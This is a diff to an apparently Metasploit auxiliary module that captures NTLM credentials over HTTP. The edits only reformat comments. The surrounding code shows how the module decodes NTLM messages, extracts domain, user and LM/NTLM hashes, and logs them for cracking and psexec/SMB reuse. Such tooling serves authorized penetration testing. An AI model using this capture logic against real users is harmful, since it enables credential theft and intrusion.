@@ -118,7 +118,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def handle_auth(cli,hash)
-    #authorization string is base64 encoded message
+    # authorization string is base64 encoded message
     message = Rex::Text.decode_base64(hash)
 
     if(message[8,1] == "\x01")
@@ -142,7 +142,7 @@ class Metasploit3 < Msf::Auxiliary
       response.headers['WWW-Authenticate'] = "NTLM " + chalhash
       return response
 
-    #if the message is a type 3 message, then we have our creds
+    # if the message is a type 3 message, then we have our creds
     elsif(message[8,1] == "\x03")
       domain,user,host,lm_hash,ntlm_hash = MESSAGE.process_type3_message(hash)
       nt_len = ntlm_hash.length
@@ -156,7 +156,7 @@ class Metasploit3 < Msf::Auxiliary
         if arg[:lm_hash][16,32] == '0' * 32
           arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
         end
-      #if the length of the ntlm response is not 24 then it will be bigger and represent
+      # if the length of the ntlm response is not 24 then it will be bigger and represent
       # a ntlmv2 response
       elsif nt_len > 48 #lmv2/ntlmv2
         arg = { :ntlm_ver   => NTLM_CONST::NTLM_V2_RESPONSE,
@@ -308,8 +308,8 @@ class Metasploit3 < Msf::Auxiliary
           "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
           "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
-        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
+        # we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+        # also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
         smb_db_type_hash = "smb_netv1_hash"
         capturelogmessage =
           "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
@@ -324,7 +324,7 @@ class Metasploit3 < Msf::Auxiliary
       print_status(capturelogmessage)
 
       # DB reporting
-      # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
+      # Rem : one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
       report_auth_info(
         :host  => ip,
